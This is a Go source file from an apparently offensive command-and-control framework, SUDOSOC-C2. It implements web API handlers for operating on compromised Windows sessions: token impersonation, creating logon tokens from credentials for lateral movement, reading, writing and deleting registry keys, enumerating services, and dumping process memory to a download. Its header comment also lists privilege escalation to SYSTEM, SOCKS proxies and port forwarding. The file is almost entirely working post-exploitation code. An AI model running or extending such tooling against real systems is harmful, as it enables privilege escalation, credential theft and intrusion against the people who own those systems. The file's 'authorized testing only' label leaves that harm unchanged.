package web

/*
	SUDOSOC-C2 — Power Operations API
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Endpoints:
	  ── Privilege / Token ────────────────────────────────────────────────────
	  GET  /api/sessions/{id}/token              — current token owner
	  POST /api/sessions/{id}/getsystem          — escalate to SYSTEM (defined in api_advanced.go)
	  POST /api/sessions/{id}/impersonate        — impersonate user token
	  POST /api/sessions/{id}/maketoken          — create logon token with creds
	  POST /api/sessions/{id}/revtoself          — revert to original token
	  GET  /api/sessions/{id}/getprivs           — token privileges (in api_advanced.go)

	  ── Windows Registry ─────────────────────────────────────────────────────
	  GET  /api/sessions/{id}/registry           — read registry value
	  GET  /api/sessions/{id}/registry/keys      — list registry subkeys
	  GET  /api/sessions/{id}/registry/values    — list registry values
	  POST /api/sessions/{id}/registry           — write registry value
	  DELETE /api/sessions/{id}/registry         — delete registry key

	  ── Windows Services ─────────────────────────────────────────────────────
	  GET  /api/sessions/{id}/services           — enumerate all services

	  ── Process ──────────────────────────────────────────────────────────────
	  POST /api/sessions/{id}/procdump           — dump process memory

	  ── Network tunneling ────────────────────────────────────────────────────
	  GET  /api/sessions/{id}/socks              — list SOCKS proxies (server-side, via loot store)
	  POST /api/sessions/{id}/portfwd            — add port forward
*/

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"github.com/sudosoc/SUDOSOC-C2/server/core"
)

// ── Token / Privilege ─────────────────────────────────────────────────────────

// GET /api/sessions/{id}/token — current token owner
func handleTokenOwner(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.CurrentTokenOwnerReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.CurrentTokenOwner{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("token owner failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"owner": resp.GetOutput()})
}

// POST /api/sessions/{id}/impersonate — impersonate a user by username
type impersonateReq struct {
	Username string `json:"username"`
}

func handleImpersonate(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	var body impersonateReq
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Username == "" {
		jsonError(w, "username is required", http.StatusBadRequest)
		return
	}
	req := &sudosocpb.ImpersonateReq{
		Username: body.Username,
		Request:  &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Impersonate{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("impersonate failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok", "username": body.Username})
}

// POST /api/sessions/{id}/maketoken — create logon token
type makeTokenReq struct {
	Username  string `json:"username"`
	Password  string `json:"password"`
	Domain    string `json:"domain"`
	LogonType uint32 `json:"logon_type"` // 9 = LOGON32_LOGON_NEW_CREDENTIALS (default)
}

func handleMakeToken(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	var body makeTokenReq
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Username == "" {
		jsonError(w, "username and password are required", http.StatusBadRequest)
		return
	}
	lt := body.LogonType
	if lt == 0 {
		lt = 9 // LOGON_NEW_CREDENTIALS — most commonly what you want for lateral movement
	}
	req := &sudosocpb.MakeTokenReq{
		Username:  body.Username,
		Password:  body.Password,
		Domain:    body.Domain,
		LogonType: lt,
		Request:   &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.MakeToken{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("maketoken failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// POST /api/sessions/{id}/revtoself — revert to original token
func handleRevToSelf(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.RevToSelfReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.RevToSelf{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("revtoself failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// ── Registry ─────────────────────────────────────────────────────────────────

type regReadResp struct {
	Value string `json:"value"`
}

// GET /api/sessions/{id}/registry?hive=HKCU&path=Software\Microsoft&key=Version
func handleRegistryRead(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	q := r.URL.Query()
	req := &sudosocpb.RegistryReadReq{
		Hive:    q.Get("hive"),
		Path:    q.Get("path"),
		Key:     q.Get("key"),
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.RegistryRead{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("registry read failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(regReadResp{Value: resp.GetValue()})
}

// GET /api/sessions/{id}/registry/keys?hive=HKCU&path=Software\Microsoft
func handleRegistryListKeys(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	q := r.URL.Query()
	req := &sudosocpb.RegistrySubKeyListReq{
		Hive:    q.Get("hive"),
		Path:    q.Get("path"),
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.RegistrySubKeyList{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("registry list keys failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(resp.GetSubkeys())
}

// GET /api/sessions/{id}/registry/values?hive=HKCU&path=Software\Microsoft
func handleRegistryListValues(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	q := r.URL.Query()
	req := &sudosocpb.RegistryListValuesReq{
		Hive:    q.Get("hive"),
		Path:    q.Get("path"),
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.RegistryValuesList{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("registry list values failed: %v", err), http.StatusInternalServerError)
		return
	}
	// RegistryValuesList.ValueNames is repeated string
	_ = json.NewEncoder(w).Encode(resp.GetValueNames())
}

// POST /api/sessions/{id}/registry — write a registry value
type regWriteReq struct {
	Hive        string `json:"hive"`
	Path        string `json:"path"`
	Key         string `json:"key"`
	StringValue string `json:"string_value,omitempty"`
	DWordValue  uint32 `json:"dword_value,omitempty"`
	QWordValue  uint64 `json:"qword_value,omitempty"`
	Type        uint32 `json:"type"` // 1=REG_SZ, 4=REG_DWORD, 11=REG_QWORD
}

func handleRegistryWrite(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	var body regWriteReq
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "invalid request", http.StatusBadRequest)
		return
	}
	req := &sudosocpb.RegistryWriteReq{
		Hive:        body.Hive,
		Path:        body.Path,
		Key:         body.Key,
		StringValue: body.StringValue,
		DWordValue:  body.DWordValue,
		QWordValue:  body.QWordValue,
		Type:        body.Type,
		Request:     &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.RegistryWrite{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("registry write failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// DELETE /api/sessions/{id}/registry?hive=HKCU&path=Software\Microsoft\key
func handleRegistryDelete(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	q := r.URL.Query()
	req := &sudosocpb.RegistryDeleteKeyReq{
		Hive:    q.Get("hive"),
		Path:    q.Get("path"),
		Key:     q.Get("key"),
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.RegistryDeleteKey{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("registry delete failed: %v", err), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// ── Windows Services ──────────────────────────────────────────────────────────

type serviceJSON struct {
	Name        string `json:"name"`
	DisplayName string `json:"display_name"`
	Description string `json:"description"`
	Status      uint32 `json:"status"`
	StartupType uint32 `json:"startup_type"`
	BinPath     string `json:"bin_path"`
}

// GET /api/sessions/{id}/services
func handleServices(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.ServicesReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Services{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("services failed: %v", err), http.StatusInternalServerError)
		return
	}
	svcs := make([]serviceJSON, 0, len(resp.GetDetails()))
	for _, d := range resp.GetDetails() {
		svcs = append(svcs, serviceJSON{
			Name:        d.GetName(),
			DisplayName: d.GetDisplayName(),
			Description: d.GetDescription(),
			Status:      d.GetStatus(),
			StartupType: d.GetStartupType(),
			BinPath:     d.GetBinPath(),
		})
	}
	_ = json.NewEncoder(w).Encode(svcs)
}

// ── Process Dump ──────────────────────────────────────────────────────────────

// POST /api/sessions/{id}/procdump  body: {"pid": 1234}
// Returns the dump file as an octet-stream download.
func handleProcDump(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	var body struct {
		PID     int32 `json:"pid"`
		Timeout int32 `json:"timeout"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.PID == 0 {
		jsonError(w, "pid is required", http.StatusBadRequest)
		return
	}
	timeout := body.Timeout
	if timeout == 0 {
		timeout = 360
	}
	req := &sudosocpb.ProcessDumpReq{
		Pid:     body.PID,
		Timeout: timeout,
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.ProcessDump{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("procdump failed: %v", err), http.StatusInternalServerError)
		return
	}
	data := resp.GetData()
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="pid_%d.dmp"`, body.PID))
	_, _ = w.Write(data)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Expose the core sessions so other packages can access them without import cycle.
// Already provided by api_sessions.go → getSession().
// We reference core.Sessions directly here.
var _ = core.Sessions
